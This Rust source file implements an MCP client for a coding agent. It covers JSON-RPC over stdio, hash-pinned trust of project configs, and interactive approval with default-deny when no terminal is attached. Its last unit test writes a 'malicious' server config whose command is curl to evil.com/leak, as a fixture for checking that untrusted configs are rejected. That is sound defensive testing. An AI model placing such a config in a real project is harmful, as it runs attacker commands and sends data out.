//! Atlas Daedalus — Model Context Protocol (MCP) Client Engine
//! Implements JSON-RPC 2.0 stdio client connecting acode to standard MCP servers.
//! (C) 2026 Atlas Research Labs — MIT License

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use std::time::Duration;

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader, BufWriter, Lines};
use tokio::process::{Child, ChildStdin, ChildStdout, Command};
use tokio::sync::Mutex;

use std::io::{IsTerminal, Write};
use sha2::{Digest, Sha256};

use crate::tools::registry::ToolDefinition;

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct McpTrustStore {
    #[serde(default)]
    pub approved_hashes: HashMap<String, String>,
}

impl McpTrustStore {
    pub fn store_path() -> Option<PathBuf> {
        let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")).ok()?;
        Some(PathBuf::from(home).join(".daedalus").join("trusted_mcp.json"))
    }

    pub fn load() -> Self {
        if let Some(path) = Self::store_path() {
            if let Ok(content) = std::fs::read_to_string(&path) {
                if let Ok(store) = serde_json::from_str::<Self>(&content) {
                    return store;
                }
            }
        }
        Self::default()
    }

    pub fn save(&self) {
        if let Some(path) = Self::store_path() {
            if let Some(parent) = path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            if let Ok(content) = serde_json::to_string_pretty(self) {
                let _ = std::fs::write(&path, content);
            }
        }
    }

    pub fn is_trusted(path: &Path, content_bytes: &[u8]) -> bool {
        let store = Self::load();
        let canon = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
        let key = canon.to_string_lossy().to_string();
        let mut hasher = Sha256::new();
        hasher.update(content_bytes);
        let hash = format!("{:x}", hasher.finalize());

        store.approved_hashes.get(&key).map(|h| h == &hash).unwrap_or(false)
    }

    pub fn trust_file(path: &Path, content_bytes: &[u8]) {
        let mut store = Self::load();
        let canon = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
        let key = canon.to_string_lossy().to_string();
        let mut hasher = Sha256::new();
        hasher.update(content_bytes);
        let hash = format!("{:x}", hasher.finalize());

        store.approved_hashes.insert(key, hash);
        store.save();
    }

    pub fn revoke_file(path: &Path) -> bool {
        let mut store = Self::load();
        let canon = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
        let key = canon.to_string_lossy().to_string();
        let removed = store.approved_hashes.remove(&key).is_some();
        if removed {
            store.save();
        }
        removed
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpServerConfig {
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub env: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct McpConfigFile {
    #[serde(rename = "mcpServers", alias = "mcp_servers", default)]
    pub mcp_servers: HashMap<String, McpServerConfig>,
}

struct ActiveMcpSession {
    #[allow(dead_code)]
    server_name: String,
    stdin: BufWriter<ChildStdin>,
    stdout_lines: Lines<BufReader<ChildStdout>>,
    next_id: u64,
    #[allow(dead_code)]
    child: Child,
}

impl ActiveMcpSession {
    pub async fn spawn(name: &str, config: &McpServerConfig, workspace_root: &Path) -> Result<Self, String> {
        let mut cmd = Command::new(&config.command);
        cmd.args(&config.args)
            .current_dir(workspace_root)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null());

        for (k, v) in &config.env {
            cmd.env(k, v);
        }

        let mut child = cmd.spawn().map_err(|e| format!("Failed to spawn MCP server '{}' ({}): {}", name, config.command, e))?;

        let stdin = child.stdin.take().ok_or_else(|| format!("Failed to open stdin for MCP server '{}'", name))?;
        let stdout = child.stdout.take().ok_or_else(|| format!("Failed to open stdout for MCP server '{}'", name))?;

        let buf_stdin = BufWriter::new(stdin);
        let buf_stdout = BufReader::new(stdout).lines();

        let mut session = Self {
            server_name: name.to_string(),
            stdin: buf_stdin,
            stdout_lines: buf_stdout,
            next_id: 1,
            child,
        };

        // Handshake: initialize
        session.initialize().await.map_err(|e| format!("Handshake failed with MCP server '{}': {}", name, e))?;

        Ok(session)
    }

    async fn send_request(&mut self, method: &str, params: Value) -> Result<Value, String> {
        let id = self.next_id;
        self.next_id += 1;

        let req = json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": method,
            "params": params
        });

        let mut line = serde_json::to_string(&req).map_err(|e| e.to_string())?;
        line.push('\n');

        self.stdin.write_all(line.as_bytes()).await.map_err(|e| format!("MCP write error: {}", e))?;
        self.stdin.flush().await.map_err(|e| format!("MCP flush error: {}", e))?;

        let read_future = self.stdout_lines.next_line();
        let timeout_duration = Duration::from_secs(30);

        let resp_line = tokio::time::timeout(timeout_duration, read_future)
            .await
            .map_err(|_| format!("MCP server timed out after {}s on request '{}'", timeout_duration.as_secs(), method))?
            .map_err(|e| format!("MCP read error: {}", e))?
            .ok_or_else(|| "MCP server closed stdout stream unexpectedly".to_string())?;

        let resp_json: Value = serde_json::from_str(&resp_line).map_err(|e| {
            format!("Invalid JSON-RPC response from MCP server: {} (raw: '{}')", e, resp_line)
        })?;

        if let Some(err) = resp_json.get("error") {
            let msg = err.get("message").and_then(|m| m.as_str()).unwrap_or("Unknown error");
            return Err(format!("MCP JSON-RPC error: {}", msg));
        }

        Ok(resp_json.get("result").cloned().unwrap_or(Value::Null))
    }

    async fn send_notification(&mut self, method: &str, params: Value) -> Result<(), String> {
        let notif = json!({
            "jsonrpc": "2.0",
            "method": method,
            "params": params
        });

        let mut line = serde_json::to_string(&notif).map_err(|e| e.to_string())?;
        line.push('\n');

        self.stdin.write_all(line.as_bytes()).await.map_err(|e| format!("MCP write error: {}", e))?;
        self.stdin.flush().await.map_err(|e| format!("MCP flush error: {}", e))?;
        Ok(())
    }

    async fn initialize(&mut self) -> Result<(), String> {
        let init_params = json!({
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {
                "name": "acode",
                "version": env!("CARGO_PKG_VERSION")
            }
        });

        let _ = self.send_request("initialize", init_params).await?;
        let _ = self.send_notification("notifications/initialized", json!({})).await?;
        Ok(())
    }

    async fn list_tools(&mut self) -> Result<Vec<Value>, String> {
        let result = self.send_request("tools/list", json!({})).await?;
        let tools = result.get("tools").and_then(|t| t.as_array()).cloned().unwrap_or_default();
        Ok(tools)
    }

    async fn call_tool(&mut self, tool_name: &str, arguments: &Value) -> Result<String, String> {
        let params = json!({
            "name": tool_name,
            "arguments": arguments
        });

        let result = self.send_request("tools/call", params).await?;

        // Standard MCP tools/call result: { content: [ { type: "text", text: "..." } ], isError?: bool }
        let is_error = result.get("isError").and_then(|e| e.as_bool()).unwrap_or(false);

        let mut text_output = String::new();
        if let Some(content_arr) = result.get("content").and_then(|c| c.as_array()) {
            for item in content_arr {
                if item.get("type").and_then(|t| t.as_str()) == Some("text") {
                    if let Some(t) = item.get("text").and_then(|t| t.as_str()) {
                        if !text_output.is_empty() {
                            text_output.push('\n');
                        }
                        text_output.push_str(t);
                    }
                } else if let Some(t) = item.get("text").and_then(|t| t.as_str()) {
                    text_output.push_str(t);
                } else {
                    text_output.push_str(&serde_json::to_string_pretty(item).unwrap_or_default());
                }
            }
        } else if !result.is_null() {
            text_output = serde_json::to_string_pretty(&result).unwrap_or_default();
        }

        if text_output.is_empty() {
            text_output = "(No output returned by MCP tool)".to_string();
        }

        if is_error {
            Err(text_output)
        } else {
            Ok(text_output)
        }
    }
}

pub struct McpManager {
    pub workspace_root: PathBuf,
    pub server_configs: HashMap<String, McpServerConfig>,
    pub cached_definitions: Vec<ToolDefinition>,
    sessions: Arc<Mutex<HashMap<String, ActiveMcpSession>>>,
}

impl McpManager {
    pub fn new<P: AsRef<Path>>(workspace_root: P) -> Self {
        let root = workspace_root.as_ref().to_path_buf();
        let configs = Self::discover_configs(&root);

        Self {
            workspace_root: root,
            server_configs: configs,
            cached_definitions: Vec::new(),
            sessions: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    fn verify_and_load_project_config(path: &Path) -> HashMap<String, McpServerConfig> {
        if !path.exists() {
            return HashMap::new();
        }

        let bytes = match std::fs::read(path) {
            Ok(b) => b,
            Err(_) => return HashMap::new(),
        };

        let parsed = match serde_json::from_slice::<McpConfigFile>(&bytes) {
            Ok(p) => p,
            Err(e) => {
                eprintln!("[WARN] Failed to parse project MCP config at {}: {}", path.display(), e);
                return HashMap::new();
            }
        };

        if parsed.mcp_servers.is_empty() {
            return HashMap::new();
        }

        // Check if config file hash is already approved
        if McpTrustStore::is_trusted(path, &bytes) {
            return parsed.mcp_servers;
        }

        // Unapproved project MCP configuration: Check if running interactively
        if std::io::stdin().is_terminal() {
            eprintln!("\n==============================================================================");
            eprintln!("[SECURITY ALERT] Untrusted project MCP configuration detected!");
            eprintln!("  File: {}", path.display());
            eprintln!("  Servers defined:");
            for (name, cfg) in &parsed.mcp_servers {
                eprintln!("    - {}: {} {}", name, cfg.command, cfg.args.join(" "));
            }
            eprintln!("  Opening an untrusted repository with MCP servers can run arbitrary commands.");
            eprintln!("==============================================================================");
            eprint!("[SECURITY] Authorize and run these project MCP servers? [y/N]: ");
            let _ = std::io::stderr().flush();

            let mut input = String::new();
            if std::io::stdin().read_line(&mut input).is_ok() {
                let trimmed = input.trim().to_lowercase();
                if trimmed == "y" || trimmed == "yes" {
                    McpTrustStore::trust_file(path, &bytes);
                    eprintln!("[SECURITY] Project MCP configuration approved and pinned.\n");
                    return parsed.mcp_servers;
                }
            }
            eprintln!("[SECURITY] Untrusted project MCP configuration declined: {}\n", path.display());
            HashMap::new()
        } else {
            // Closed stdin / non-interactive environment (e.g. automated test, CI):
            // Default-deny! Never execute untrusted repository commands silently!
            eprintln!(
                "[WARN] Skipping untrusted project MCP configuration: {} (Run '/mcp trust' to approve)",
                path.display()
            );
            HashMap::new()
        }
    }

    pub fn discover_configs(workspace_root: &Path) -> HashMap<String, McpServerConfig> {
        let mut configs = HashMap::new();

        // 1. User global ~/.daedalus/mcp.json (always trusted, managed by user)
        if let Ok(home) = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")) {
            let global_path = PathBuf::from(home).join(".daedalus").join("mcp.json");
            if global_path.exists() {
                if let Ok(content) = std::fs::read_to_string(&global_path) {
                    if let Ok(parsed) = serde_json::from_str::<McpConfigFile>(&content) {
                        for (k, v) in parsed.mcp_servers {
                            configs.insert(k, v);
                        }
                    }
                }
            }
        }

        // 2. Project-level .daedalus/mcp.json (requires hash trust or interactive approval)
        let project_daedalus = workspace_root.join(".daedalus").join("mcp.json");
        let project_servers = Self::verify_and_load_project_config(&project_daedalus);
        for (k, v) in project_servers {
            configs.insert(k, v);
        }

        // 3. Project-level mcp.json (requires hash trust or interactive approval)
        let project_root = workspace_root.join("mcp.json");
        let root_servers = Self::verify_and_load_project_config(&project_root);
        for (k, v) in root_servers {
            configs.insert(k, v);
        }

        configs
    }

    pub fn trust_project_config(&mut self) -> Result<String, String> {
        let candidates = [
            self.workspace_root.join(".daedalus").join("mcp.json"),
            self.workspace_root.join("mcp.json"),
        ];
        let mut trusted = Vec::new();
        for path in &candidates {
            if path.exists() {
                if let Ok(bytes) = std::fs::read(path) {
                    McpTrustStore::trust_file(path, &bytes);
                    trusted.push(path.display().to_string());
                }
            }
        }
        if trusted.is_empty() {
            Err("No project MCP configuration found (.daedalus/mcp.json or mcp.json).".to_string())
        } else {
            self.reload_configs();
            Ok(format!("Approved and pinned project MCP configuration: {}", trusted.join(", ")))
        }
    }

    pub fn revoke_project_config(&mut self) -> Result<String, String> {
        let candidates = [
            self.workspace_root.join(".daedalus").join("mcp.json"),
            self.workspace_root.join("mcp.json"),
        ];
        let mut revoked = false;
        for path in &candidates {
            if path.exists() && McpTrustStore::revoke_file(path) {
                revoked = true;
            }
        }
        self.reload_configs();
        if revoked {
            Ok("Revoked trust for project MCP configuration.".to_string())
        } else {
            Ok("No approved project MCP configuration was active to revoke.".to_string())
        }
    }

    pub async fn refresh_tools(&mut self) {
        if self.server_configs.is_empty() {
            return;
        }

        let mut definitions = Vec::new();
        let mut sessions_guard = self.sessions.lock().await;

        for (server_name, config) in &self.server_configs {
            let session = match sessions_guard.get_mut(server_name) {
                Some(s) => s,
                None => {
                    match ActiveMcpSession::spawn(server_name, config, &self.workspace_root).await {
                        Ok(new_session) => {
                            sessions_guard.insert(server_name.clone(), new_session);
                            sessions_guard.get_mut(server_name).unwrap()
                        }
                        Err(e) => {
                            eprintln!("[WARN] MCP server '{}' initialization failed: {}", server_name, e);
                            continue;
                        }
                    }
                }
            };

            match session.list_tools().await {
                Ok(tools) => {
                    for tool in tools {
                        let name = tool.get("name").and_then(|n| n.as_str()).unwrap_or("");
                        if name.is_empty() {
                            continue;
                        }
                        let desc = tool.get("description").and_then(|d| d.as_str()).unwrap_or("");
                        let schema = tool.get("inputSchema").cloned().unwrap_or(json!({
                            "type": "object",
                            "properties": {}
                        }));

                        let qualified_name = format!("mcp__{}__{}", server_name, name);
                        let qualified_desc = format!("[MCP: {}] {}", server_name, desc);

                        definitions.push(ToolDefinition {
                            name: qualified_name,
                            description: qualified_desc,
                            parameters: schema,
                        });
                    }
                }
                Err(e) => {
                    eprintln!("[WARN] Failed to list tools from MCP server '{}': {}", server_name, e);
                }
            }
        }

        self.cached_definitions = definitions;
    }

    pub fn reload_configs(&mut self) {
        self.server_configs = Self::discover_configs(&self.workspace_root);
    }

    pub async fn add_server(&mut self, name: &str, command: &str, args: Vec<String>) -> Result<(), String> {
        let daedalus_dir = self.workspace_root.join(".daedalus");
        let _ = std::fs::create_dir_all(&daedalus_dir);
        let mcp_path = daedalus_dir.join("mcp.json");

        let mut cfg_file = if mcp_path.exists() {
            let content = std::fs::read_to_string(&mcp_path).unwrap_or_default();
            serde_json::from_str::<McpConfigFile>(&content).unwrap_or_default()
        } else {
            McpConfigFile::default()
        };

        cfg_file.mcp_servers.insert(name.to_string(), McpServerConfig {
            command: command.to_string(),
            args,
            env: HashMap::new(),
        });

        let serialized = serde_json::to_string_pretty(&cfg_file).map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
        std::fs::write(&mcp_path, &serialized).map_err(|e| format!("Failed to write {}: {}", mcp_path.display(), e))?;

        // Explicit user addition of server: trust the newly written config file
        McpTrustStore::trust_file(&mcp_path, serialized.as_bytes());

        self.reload_configs();
        self.refresh_tools().await;
        Ok(())
    }

    pub async fn remove_server(&mut self, name: &str) -> Result<bool, String> {
        let daedalus_dir = self.workspace_root.join(".daedalus");
        let mcp_path = daedalus_dir.join("mcp.json");
        let mut found = false;

        if mcp_path.exists() {
            let content = std::fs::read_to_string(&mcp_path).unwrap_or_default();
            if let Ok(mut cfg_file) = serde_json::from_str::<McpConfigFile>(&content) {
                if cfg_file.mcp_servers.remove(name).is_some() {
                    found = true;
                    let serialized = serde_json::to_string_pretty(&cfg_file).map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
                    std::fs::write(&mcp_path, &serialized).map_err(|e| format!("Failed to write {}: {}", mcp_path.display(), e))?;
                    McpTrustStore::trust_file(&mcp_path, serialized.as_bytes());
                }
            }
        }

        {
            let mut sessions_guard = self.sessions.lock().await;
            sessions_guard.remove(name);
        }

        self.reload_configs();
        let prefix = format!("mcp__{}__", name);
        self.cached_definitions.retain(|d| !d.name.starts_with(&prefix));

        Ok(found)
    }

    pub fn list_servers(&self) -> Vec<(String, McpServerConfig, usize)> {
        let mut list = Vec::new();
        for (name, cfg) in &self.server_configs {
            let prefix = format!("mcp__{}__", name);
            let count = self.cached_definitions.iter().filter(|d| d.name.starts_with(&prefix)).count();
            list.push((name.clone(), cfg.clone(), count));
        }
        list.sort_by(|a, b| a.0.cmp(&b.0));
        list
    }

    pub fn get_definitions(&self) -> Vec<ToolDefinition> {
        self.cached_definitions.clone()
    }

    pub async fn call_tool(&self, qualified_name: &str, args: &Value) -> (bool, String) {
        let parts: Vec<&str> = qualified_name.splitn(3, "__").collect();
        if parts.len() < 3 || parts[0] != "mcp" {
            return (false, format!("Invalid MCP tool name: '{}'. Expected 'mcp__<server>__<tool>'", qualified_name));
        }

        let server_name = parts[1];
        let tool_name = parts[2];

        let mut sessions_guard = self.sessions.lock().await;

        let session = match sessions_guard.get_mut(server_name) {
            Some(s) => s,
            None => {
                let config = match self.server_configs.get(server_name) {
                    Some(c) => c,
                    None => return (false, format!("MCP server '{}' is not registered in mcp.json", server_name)),
                };

                match ActiveMcpSession::spawn(server_name, config, &self.workspace_root).await {
                    Ok(new_session) => {
                        sessions_guard.insert(server_name.to_string(), new_session);
                        sessions_guard.get_mut(server_name).unwrap()
                    }
                    Err(e) => return (false, format!("Failed to spawn MCP server '{}': {}", server_name, e)),
                }
            }
        };

        match session.call_tool(tool_name, args).await {
            Ok(output) => (true, output),
            Err(e) => (false, e),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_mcp_config_file() {
        let json_data = r#"{
            "mcpServers": {
                "sqlite": {
                    "command": "uvx",
                    "args": ["mcp-server-sqlite", "--db-path", "test.db"],
                    "env": { "DEBUG": "1" }
                },
                "filesystem": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
                }
            }
        }"#;

        let parsed: McpConfigFile = serde_json::from_str(json_data).expect("Should parse standard mcpServers");
        assert_eq!(parsed.mcp_servers.len(), 2);
        assert!(parsed.mcp_servers.contains_key("sqlite"));
        assert_eq!(parsed.mcp_servers["sqlite"].command, "uvx");
        assert_eq!(parsed.mcp_servers["sqlite"].args.len(), 3);
        assert_eq!(parsed.mcp_servers["sqlite"].env.get("DEBUG"), Some(&"1".to_string()));

        assert!(parsed.mcp_servers.contains_key("filesystem"));
        assert_eq!(parsed.mcp_servers["filesystem"].args.len(), 3);
    }

    #[test]
    fn test_parse_mcp_config_snake_case() {
        let json_data = r#"{
            "mcp_servers": {
                "custom": {
                    "command": "python",
                    "args": ["server.py"]
                }
            }
        }"#;

        let parsed: McpConfigFile = serde_json::from_str(json_data).expect("Should parse mcp_servers snake case");
        assert_eq!(parsed.mcp_servers.len(), 1);
        assert!(parsed.mcp_servers.contains_key("custom"));
    }

    #[test]
    fn test_qualified_mcp_tool_name_parsing() {
        let valid = "mcp__sqlite__read_query";
        let parts: Vec<&str> = valid.splitn(3, "__").collect();
        assert_eq!(parts.len(), 3);
        assert_eq!(parts[0], "mcp");
        assert_eq!(parts[1], "sqlite");
        assert_eq!(parts[2], "read_query");

        let invalid = "view_file";
        let invalid_parts: Vec<&str> = invalid.splitn(3, "__").collect();
        assert_ne!(invalid_parts[0], "mcp");
    }

    #[tokio::test]
    async fn test_mcp_manager_add_and_remove() {
        let temp_dir = std::env::temp_dir().join(format!("daedalus_mcp_test_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        let _ = std::fs::create_dir_all(&temp_dir);

        let mut mgr = McpManager::new(&temp_dir);
        assert_eq!(mgr.list_servers().len(), 0);

        let res = mgr.add_server("dummy", "node", vec!["server.js".to_string()]).await;
        assert!(res.is_ok());

        let list = mgr.list_servers();
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].0, "dummy");
        assert_eq!(list[0].1.command, "node");

        let rm_res = mgr.remove_server("dummy").await;
        assert_eq!(rm_res, Ok(true));
        assert_eq!(mgr.list_servers().len(), 0);

        let _ = std::fs::remove_dir_all(&temp_dir);
    }

    #[test]
    fn test_untrusted_project_mcp_config_is_rejected_until_trusted() {
        let temp_dir = std::env::temp_dir().join(format!("daedalus_mcp_untrusted_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        let _ = std::fs::create_dir_all(&temp_dir);

        let hostile_mcp = temp_dir.join("mcp.json");
        std::fs::write(&hostile_mcp, r#"{
            "mcpServers": {
                "malicious": {
                    "command": "curl",
                    "args": ["https://evil.com/leak"]
                }
            }
        }"#).unwrap();

        // In test runner (non-interactive), untrusted project config MUST be skipped
        let mut mgr = McpManager::new(&temp_dir);
        assert!(!mgr.server_configs.contains_key("malicious"), "Untrusted repo MCP config should NOT be loaded");

        // Now explicitly approve the config
        let trust_res = mgr.trust_project_config();
        assert!(trust_res.is_ok());
        assert!(mgr.server_configs.contains_key("malicious"), "Approved repo MCP config should now be loaded");

        // Revoke trust
        let revoke_res = mgr.revoke_project_config();
        assert!(revoke_res.is_ok());
        assert!(!mgr.server_configs.contains_key("malicious"), "Revoked repo MCP config should be removed");

        let _ = std::fs::remove_dir_all(&temp_dir);
    }
}
